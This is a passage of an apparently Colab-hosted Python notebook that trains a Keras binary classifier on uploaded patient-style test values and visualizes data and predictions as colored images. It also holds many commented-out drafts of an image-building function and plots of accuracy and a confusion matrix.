    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use red for class 0 and green for class 1
        if predictions[i] == 0:
            image[i, -1] = np.array([255, 0, 0])  # Red
        elif predictions[i] == 1:
            image[i, -1] = np.array([0, 128, 0])  # Green

    return image

def create_image(data, predictions, label_colors):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        image[i, -1] = label_colors[predictions[i]]

    return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [np.min(data), np.max(data)], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns - 1):  # Exclude the last column for now
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data[:, j]), np.max(data[:, j])], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image


# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     data_array = np.array(data)  # Convert data to a NumPy array

#     for i in range(num_rows):
#         for j in range(num_columns - 1):  # Exclude the last column for now
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     data_array = np.array(data)  # Convert data to a NumPy array

#     for i in range(num_rows):
#         for j in range(num_columns - 1):  # Exclude the last column for now
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     # Now, normalize the last column separately to achieve grayscale
#     min_pixel_value = np.min(image[:, -1])
#     max_pixel_value = np.max(image[:, -1])
#     for i in range(num_rows):
#         pixel_value = int(np.interp(image[i, -1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Now, normalize the last column separately to achieve grayscale


#         min_pixel_value = np.min(data[:, -1])
#         max_pixel_value = np.max(data[:, -1])
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Normalize the last column separately to achieve grayscale
#         min_pixel_value = np.min(data[i])
#         max_pixel_value = np.max(data[i])
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image


# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     # Normalize the first two columns independently
#     for j in range(2):
#         min_pixel_value = np.min(data[:, j])
#         max_pixel_value = np.max(data[:, j])
#         for i in range(num_rows):
#             pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#     # Normalize the last column separately to achieve grayscale
#     min_pixel_value = np.min(data[:, -1])
#     max_pixel_value = np.max(data[:, -1])
#     for i in range(num_rows):
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     # Convert data to a NumPy array
#     data = np.array(data)

#     num_rows, num_columns = data.shape
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     # Normalize the first two columns independently
#     for j in range(2):
#         min_pixel_value = np.min(data[:, j])
#         max_pixel_value = np.max(data[:, j])
#         for i in range(num_rows):
#             pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#     # Normalize the last column separately to achieve grayscale
#     min_pixel_value = np.min(data[:, -1])
#     max_pixel_value = np.max(data[:, -1])
#     for i in range(num_rows):
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image


# def create_imageN(data, predictions, label_colors=None):
#     # Convert data to a NumPy array
#     data = np.array(data)

#     num_rows, num_columns = data.shape
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     # Normalize the first two columns independently
#     for j in range(2):
#         min_pixel_value = np.min(data[:, j])
#         max_pixel_value = np.max(data[:, j])
#         for i in range(num_rows):
#             pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#     # Normalize the last column separately to achieve grayscale
#     min_pixel_value_last = np.min(data[:, -1])
#     max_pixel_value_last = np.max(data[:, -1])
#     for i in range(num_rows):
#         pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value_last, max_pixel_value_last], [0, 255]))
#         image[i, -1] = np.array([pixel_value_last] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


#     print(""**************************"",num_training_rows,""*******************"")

#     min_pixel_value = np.min(X_train_normalized)
#     max_pixel_value = np.max(X_train_normalized)

#     # Populate image_training with consistent gray and red/green colors based on the labels in the last column
#     # for i, label in enumerate(y_train):
#     #     for j in range(len(X_train[0])
#     #         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#     #         image_training[i, j] = np.array([pixel_value] * 3)
#     #         image_training[i, -1] = np.array([128, 128, 128])
#     #     if label == 0:
#     #         image_training[i, -1] = np.array([0, 128, 0])
#     #     elif label == 1:
#     #         image_training[i, -1] = np.array([255, 0, 0])



#     # Populate image_training with consistent gray and red/green colors based on the labels in the last column
#     for i, label in enumerate(y_train):
#         for j in range(len(X_train[0])):
#             pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#             image_training[i, j] = np.array([pixel_value] * 3)
#         image_training[i, -1] = np.array([128, 128, 128])
#         if label == 0:
#             image_training[i, -1] = np.array([0, 128, 0])
#         elif label == 1:
#             image_training[i, -1] = np.array([255, 0, 0])


#     return image_training








# def create_imageN(data, predictions, label_colors=None):
#     num_training_rows = 1  # Set the number of rows to 1
#     image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)

#     min_pixel_value = np.min(X_train_normalized)
#     max_pixel_value = np.max(X_train_normalized)

#     # Populate image_training with consistent gray and red/green colors based on the labels in the last column
#     for j in range(len(X_train[0])):
#         pixel_value = int(np.interp(data[0][j], [min_pixel_value, max_pixel_value], [0, 255]))
#         image_training[0, j] = np.array([pixel_value] * 3)

#     image_training[0, -1] = np.array([128, 128, 128])  # Set a consistent gray background

#     label = y_train[0]
#     if label == 0:
#         image_training[0, -1] = np.array([0, 128, 0])  # Green for label 0
#     elif label == 1:
#         image_training[0, -1] = np.array([255, 0, 0])  # Red for label 1

#     return image_training

def create_imageN(data, predictions, label_colors=None):
    num_training_rows = len(data)  # Set the number of rows based on the data
    num_columns = len(data[0])

    image_training = np.zeros((num_training_rows, num_columns + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)


    

    for i in range(num_training_rows):
        # Normalize the first columns independently
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image_training[i, -1] = label_colors[predictions[i]]

    return image_training




# Load data from a file
#file_path = 'C:/Users/Hynek/Desktop/example4.txt'
from google.colab import files
uploaded = files.upload()

# Tento kód otevře dialogové okno pro výběr souboru z vašeho počítače.
import io
import pandas as pd

# Předpokládáme, že jste nahráli CSV soubor
for fn in uploaded.keys():
  print('User uploaded file ""{name}"" with length {length} bytes'.format(
      name=fn, length=len(uploaded[fn])))
  path = io.BytesIO(uploaded[fn])  # Pro soubory, které potřebují být čteny jako binární objekty
  df = pd.read_csv(path)
  print(df.head())  # Vypíše prvních pět řádků DataFrame


all_results = []
#with open(file_path, 'r') as file:
#    file_content = file.read()

# Execute the content as Python code
##exec(file_content)

import os
import shutil
import ast

for filename in uploaded.keys():
    original_path = f""/content/{filename}""
    destination_path = os.path.join(""/content/"", ""/content/DATA2"")
    shutil.move(original_path, destination_path)
    print(f""Soubor {filename} byl přesunut do {destination_path}"")

file_path = '/content/DATA2'  # Cesta k souboru
with open(file_path, 'r') as file:
    code = file.read()

A_list = ast.literal_eval(code)


# Převod na NumPy pole
A = np.array(A_list)

#exec(code)

# Now, all_results contains lists corresponding to each row in the CSV file
##print(all_results)

# Assign values to variables dynamically based on the rows of matrix A
for i, row in enumerate(A, start=1):
    globals()[f""person{i}_results""] = list(row)

# Print the assigned variables
for i in range(1, len(A) + 1):
  #  print(f""person{i}_results {globals()[f'person{i}_results']}"")
    all_results.append(f""person{i}_results"")
##print(all_results)



result_variables = []

# Loop through the variable names and get the corresponding variables using globals()
for var_name in all_results:
    result_variables.append(globals()[var_name])

# Now, result_variables contains the variables with names specified in variable_names
#print(result_variables)

all_results = result_variables
new_persons_results = result_variables


# # Define the blood test results for sixteen persons
# person1_results = [80, 90, 100, 125, 120, 0]
# person2_results = [95, 105, 115, 110, 135, 1]
# person3_results = [110, 120, 130, 140, 150, 0]
# person4_results = [100, 110, 120, 130, 140, 1]
# person5_results = [105, 115, 100, 105, 110, 0]
# person6_results = [90, 110, 115, 95, 120, 1]
# person7_results = [116, 99, 106, 105, 119, 0]
# person8_results = [111, 93, 118, 118, 107, 1]
# person9_results = [107, 97, 105, 119, 98, 0]
# person10_results = [92, 108, 90, 117, 111, 1]
# person11_results = [118, 105, 103, 118, 99, 0]
# person12_results = [97, 115, 101, 101, 113, 1]
# person13_results = [95, 111, 93, 112, 120, 0]
# person14_results = [100, 112, 118, 109, 103, 1]
# person15_results = [113, 91, 94, 93, 99, 0]
# person16_results = [103, 92, 95, 110, 98, 1]

# # Combine the results into a list
# all_results = [person1_results, person2_results, person3_results, person4_results,
#                person5_results, person6_results, person7_results, person8_results,
#                person9_results, person10_results, person11_results, person12_results,
#                person13_results, person14_results, person15_results, person16_results]


# #all_results = [person1_results, person2_results]


# Extract the last column (0 or 1) as labels
# labels = [results[-1] for results in all_results]

# # Remove the last column from the dataset
# data = [results[:-1] for results in all_results]

# # Define the number of rows for training and testing
# num_training_rows = 100
# num_testing_rows = 10

# # Split the data into training and testing datasets
# #X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

# X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]


# # Normalize the training data
# min_values = np.min(X_train, axis=0)
# max_values = np.max(X_train, axis=0)
# X_train_normalized = (X_train - min_values) / (max_values - min_values)


# # Normalize the training data
# min_values = np.min(X_train, axis=0)
# max_values = np.max(X_train, axis=0)
# X_train_normalized = (X_train - min_values) / (max_values - min_values)

# # Normalize the testing data using the min and max values of the training data
# X_test_normalized = (X_test - min_values) / (max_values - min_values)


# # Print normalized training data
# print(""Normalized Training Data:"")
# print(X_train_normalized)
# print(""Adenormalized"",X_train_normalized*(max_values - min_values)+min_values,""Bdenormalized"")

# # Define a simple neural network model
# # model = tf.keras.Sequential([
# #     tf.keras.layers.Dense(128, activation='relu', input_shape=(len(X_train[0]),)),
# #     tf.keras.layers.Dense(64, activation='relu'),
# #     tf.keras.layers.Dense(1, activation='sigmoid')
# # ])

# # # Compile the model
# # model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])


# import tensorflow as tf

# # Vylepšený model
# model = tf.keras.Sequential([
#     tf.keras.layers.Dense(256, activation='relu', input_shape=(len(X_train[0]),)),
#     tf.keras.layers.Dropout(0.3),
#     tf.keras.layers.Dense(128, activation='relu'),
#     tf.keras.layers.Dropout(0.3),
#     tf.keras.layers.Dense(64, activation='relu'),
#     tf.keras.layers.Dropout(0.3),
#     tf.keras.layers.Dense(1, activation='sigmoid')
# ])

# # Použití Adam optimizer s learning rate schedulerem
# lr_schedule = tf.keras.optimizers.schedules.ExponentialDecay(
#     initial_learning_rate=1e-3,
#     decay_steps=10000,
#     decay_rate=0.9
# )
# optimizer = tf.keras.optimizers.Adam(learning_rate=lr_schedule)

# # Kompilace modelu
# model.compile(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy'])


# # Lists to store accuracy values
# accuracy_history = []


labels = [results[-1] for results in all_results]

# Odstranění posledního sloupce z datasetu
data = [results[:-1] for results in all_results]

# Definice počtu řádků pro trénování a testování
num_training_rows = 100
num_testing_rows = 100

# Rozdělení datasetu na trénovací a testovací sady
X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

# Převod na NumPy pole
X_train = np.array(X_train)
X_test = np.array(X_test)
y_train = np.array(y_train)
y_test = np.array(y_test)

# Normalizace dat (s ohledem na -1)
min_values = np.min(X_train[X_train != -1], axis=0)
max_values = np.max(X_train[X_train != -1], axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)
X_train_normalized[X_train == -1] = 0  # Nastavení -1 na 0 po normalizaci

X_test_normalized = (X_test - min_values) / (max_values - min_values)
X_test_normalized[X_test == -1] = 0  # Nastavení -1 na 0 po normalizaci

# Vylepšený model
model = tf.keras.Sequential([
    tf.keras.layers.Dense(256, activation='relu', input_shape=(len(X_train[0]),)),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(128, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Použití Adam optimizer s learning rate schedulerem
lr_schedule = tf.keras.optimizers.schedules.ExponentialDecay(
    initial_learning_rate=1e-3,
    decay_steps=10000,
    decay_rate=0.9
)
optimizer = tf.keras.optimizers.Adam(learning_rate=lr_schedule)

# Kompilace modelu
model.compile(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy'])

# Lists to store accuracy values
accuracy_history = []



# Create images for the training data
image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


min_pixel_value = np.min(X_train_normalized)
max_pixel_value = np.max(X_train_normalized)

# Populate image_training with consistent gray and red/green colors based on the labels in the last column
# for i, label in enumerate(y_train):
#     for j in range(len(X_train[0])
#         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#         image_training[i, j] = np.array([pixel_value] * 3)
#         image_training[i, -1] = np.array([128, 128, 128])
#     if label == 0:
#         image_training[i, -1] = np.array([0, 128, 0])
#     elif label == 1:
#         image_training[i, -1] = np.array([255, 0, 0])



# Populate image_training with consistent gray and red/green colors based on the labels in the last column
for i, label in enumerate(y_train):
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, j] = np.array([pixel_value] * 3)
    image_training[i, -1] = np.array([128, 128, 128])
    if label == 0:
        image_training[i, -1] = np.array([0, 128, 0])
    elif label == 1:
        image_training[i, -1] = np.array([255, 0, 0])






from tqdm.notebook import tqdm_notebook


###ZDE VLOZTE DATA OD NOVYCH PACIENTU


# Train the model for 400 epochs
epochs = 1390
# Assuming 'new_persons_results' is a list of new persons, where each person is represented as a list of features
new_persons_results = [
   # [101, 112],
   # [0.54422416, 0.02778176],
   # [22.57372914, 17.96922325],
#    [22.57372914, 17.96922325]
    # Add more new persons as needed
#          [23.65780072, 18.8599168 ],
#          [22.57372914, 17.96922325],
#          [32.55342397, 29.46365141],
#          [ 6.71803504, 25.70466547],
#          [ 6.71803504, 25.70466547],
#          [14.40191857, 16.77085649],
#          [17.45790731, 21.76521471],
#          [2110.02796947, 73.45445955],
#          [30.29513837, 62.90111289],
#          [15.1289778,  32.40267702],

 [23.65780072, 18.8599168 ],
 [22.57372914, 17.96922325],
 [32.55342397, 29.46365141],
 [ 6.71803504, 25.70466547],
 [14.40191857, 16.77085649],
 [17.45790731, 21.76521471],
 [20.02796947, 73.45445955],
 [26.2042, 10.6782],
 [35.7258, 12.8027],
 [21.2, 7.8],

# [23.657800719276743,18.859916797201468,0],
# [22.573729142097473,17.96922325097786,0],
# [32.55342396968757,29.463651408558803,0],
# [6.718035041529263,25.704665468161718,2],
# [14.401918566243225,16.770856492924658,0],
# [17.457907312962234,21.76521470574044,0],
# [20.02796946568093,73.45445954770891,2],  

]

import sys

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=False)
    accuracy_history.append(history.history['accuracy'][0])

    if epoch == 1:
        # Normalize the testing data
        X_test_normalized = (X_test - min_values) / (max_values - min_values)
        y_pred_after_2nd_epoch = model.predict(X_test_normalized)
        y_pred_binary_after_2nd_epoch = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch]
        image_testing_before_2nd_epoch = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch, label_colors_testing)

    if epoch >= epochs-1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")
        sys.stdout.flush()

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=0):
            # Ensure that personNEW_results has the same number of features as the model expects
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""

            personNEW_results_normalized = (np.array(personNEW_results) - min_values) / (max_values - min_values)

            personNEW_prediction = model.predict(np.array([personNEW_results_normalized]))
            personNEW_label = 1 if personNEW_prediction >= 0.5 else 0
            y_pred_after_50_epochs = model.predict(X_test_normalized)
            y_pred_binary_after_50_epochs = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs]
            image_testing_after_50_epochs = create_image(X_test_normalized, y_pred_binary_after_50_epochs, label_colors_testing)

            # Create an image for the new person
            image_personNEW = create_imageN([personNEW_results_normalized], [personNEW_label], label_colors)

            # Display the images
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW)
            plt.title(f""New Person {idx}\nLabel: {personNEW_label}, Prediction: {personNEW_prediction},personNEW_results: {personNEW_results}"")
            plt.axis(""off"")
            plt.show()


# Display the images
plt.figure(figsize=(25, 15))
plt.subplot(2, 2, 1)
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")

plt.subplot(2, 2, 2)
plt.imshow(image_testing_before_2nd_epoch)
plt.title(""Testing Data (2nd Epoch)"")
plt.axis(""off"")

plt.subplot(2, 2, 3)
plt.imshow(image_testing_after_50_epochs)
plt.title(f""Testing Data ({epochs} Epochs)"")
plt.axis(""off"")

plt.subplot(2, 2, 4)
plt.imshow(image_personNEW)
plt.title(f""New Person\nLabel: {personNEW_label},[{personNEW_prediction}]"")
plt.axis(""off"")

# Plot accuracy history
plt.figure(figsize=(12, 5))
plt.plot(range(1, epochs + 1), accuracy_history, marker='o')
plt.title('Accuracy Over Epochs')
plt.xlabel('Epochs')
plt.ylabel('Accuracy')
plt.grid()

# Print normalized data
print(""Normalized PersonNEW Data:"")
print(personNEW_results_normalized)

print(""ZZ"")
personNEW_results_array = np.array(personNEW_results)

# Výpočet min a max hodnot z trénovacích dat (ignorování hodnot -1)
min_values = np.min(X_train[X_train != -1], axis=0)
max_values = np.max(X_train[X_train != -1], axis=0)

# Výpis pro kontrolu
print(""Min values:"", min_values)
print(""Max values:"", max_values)
print(""Person NEW results (before normalization):"", personNEW_results_array)

# Normalizace nových hodnot (s ohledem na rozsah trénovacích dat)
personNEW_results_normalized = (personNEW_results_array - min_values) / (max_values - min_values)

# Výpis pro kontrolu
print(""Person NEW results (after normalization):"", personNEW_results_normalized)

print(""VV"")




plt.show()

print(""X_train before normalization:"")
print(X_train)
print(""X_test before normalization:"")
print(X_test)

import seaborn as sns


print(""KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"")
print(X_test)
print(""HHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"")
print(X_train)
print(""LLLLLLLLLLLLLLLLLLLLLLLLLLLLL"")


# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix
# conf_matrix = confusion_matrix(y_train, y_pred_binary)
# print(conf_matrix)


from sklearn.metrics import confusion_matrix
from tensorflow.keras.utils import to_categorical

# # Normalize the training data
# min_values = np.min(np.concatenate([X_train, X_test], axis=0), axis=0)
# max_values = np.max(np.concatenate([X_train, X_test], axis=0), axis=0)
# X_train_normalized = (X_train - min_values) / (max_values - min_values)
# X_test_normalized = (X_test - min_values) / (max_values - min_values)

np.set_printoptions(threshold=np.inf, precision=4, suppress=True)


# # Assuming X_test_normalized and y_test are your test set data
# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix using the test set
# conf_matrix = confusion_matrix(y_test, y_pred_binary)
# print(conf_matrix)



# plt.figure(figsize=(6, 6))
# sns.heatmap(conf_matrix, annot=True, fmt=""d"", cmap=""Blues"", xticklabels=['Predicted 0', 'Predicted 1'], yticklabels=['Actual 0', 'Actual 1'])
# plt.xlabel(""Predicted Label"")
# plt.ylabel(""True Label"")
# plt.title(""Confusion Matrix"")
# plt.show()

# X_train = np.array(X_train)
# y_train_one_hot = np.array(y_train_one_hot)

# RozdÄ›lenĂ­ dat na trĂ©novacĂ­ a testovacĂ­ mnoĹľiny
###X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

###X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_training_rows], labels[:num_training_rows], labels[:num_training_rows]
X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

import numpy as np
import matplotlib.pyplot as plt
from sklearn.metrics import confusion_matrix, accuracy_score, precision_score, recall_score, f1_score
import tensorflow as tf
import seaborn as sns

# Assuming data splitting and model definition have been done correctly

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Train the model
print(""Training Start"")
for epoch in tqdm_notebook(range(1000), desc=""Training Progress""):
    model.fit(np.array(X_train_normalized), np.array(y_train), epochs=1, verbose=0)
print(""Training Complete"")

# Generate predictions from the model
predictions = (model.predict(X_test_normalized) > 0.5).astype(int)

# Convert y_test to a numpy array and then to binary labels
y_test_array = np.array(y_test)  # Convert y_test to a numpy array
y_test_binary = (y_test_array > 0.5).astype(int)  # Convert to binary

# Compute the confusion matrix
conf_matrix = confusion_matrix(y_test_binary, predictions)

# Evaluate the model's performance
accuracy = accuracy_score(y_test_binary, predictions)
precision = precision_score(y_test_binary, predictions)
recall = recall_score(y_test_binary, predictions)
f1 = f1_score(y_test_binary, predictions)

# Display the confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()

print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""Recall: {recall:.4f}"")
print(f""F1 Score: {f1:.4f}"")

print(f""Confusion Matrix2122:\n{conf_matrix}"")


import random

def find_best_pair(min_val, max_val, num_features, model, min_values, max_values):
    best_pair = None
    best_prediction = 1
    for _ in range(1000):  # Number of iterations to find the best pair
        new_data = np.random.uniform(min_val, max_val, num_features)
        new_data_normalized = (new_data - min_values) / (max_values - min_values)
        
        # Suppress model output
        tf.get_logger().setLevel('ERROR')
        with tf.device('/CPU:0'):  # Ensure to run on CPU to minimize unwanted logs
            prediction = model.predict(np.array([new_data_normalized]), verbose=0)[0][0]
        tf.get_logger().setLevel('INFO')
        
        if prediction < best_prediction:
            best_prediction = prediction
            best_pair = new_data
    return best_pair, best_prediction



best_pair, best_prediction = find_best_pair(min_values, max_values, len(X_train[0]), model, min_values, max_values)


def find_worst_pair(min_val, max_val, num_features, model, min_values, max_values):
    worst_pair = None
    worst_prediction = 0
    for _ in range(1000):  # Number of iterations to find the best pair
        new_data = np.random.uniform(min_val, max_val, num_features)
        new_data_normalized = (new_data - min_values) / (max_values - min_values)
        
        # Suppress model output
        tf.get_logger().setLevel('ERROR')
        with tf.device('/CPU:0'):  # Ensure to run on CPU to minimize unwanted logs
            prediction = model.predict(np.array([new_data_normalized]), verbose=0)[0][0]
        tf.get_logger().setLevel('INFO')
        
        if prediction > worst_prediction:
            worst_prediction = prediction
            worst_pair = new_data
    return worst_pair, worst_prediction



worst_pair, worst_prediction = find_worst_pair(min_values, max_values, len(X_train[0]), model, min_values, max_values)


print(f""Best Pair: {best_pair}, Best Prediction: {best_prediction}"")
print(f""Worst Pair: {worst_pair}, Worst Prediction: {worst_prediction}"")

import numpy as np
import matplotlib.pyplot as plt
from sklearn.decomposition import PCA
import tensorflow as tf
from tqdm.notebook import tqdm_notebook

# Vaše data
# A = [
#     [23.657800719276743,18.859916797201468,0,0],
#     [22.573729142097473,17.96922325097786,0,0],
#     [32.55342396968757,29.463651408558803,0,0],
#     [6.718035041529263,25.704665468161718,2,1],
#     [14.401918566243225,16.770856492924658,0,0],
#     [17.457907312962234,21.76521470574044,0,0],
#     [20.02796946568093,73.45445954770891,2,1],
#     [30.295138369778076,62.901112886193246,2,1],
#     [15.128977804449633,32.40267702110393,0,0],
#     [30.179457395820013,58.982492125646104,2,1],
#     [28.01649701854089,63.92781357637711,2,1],
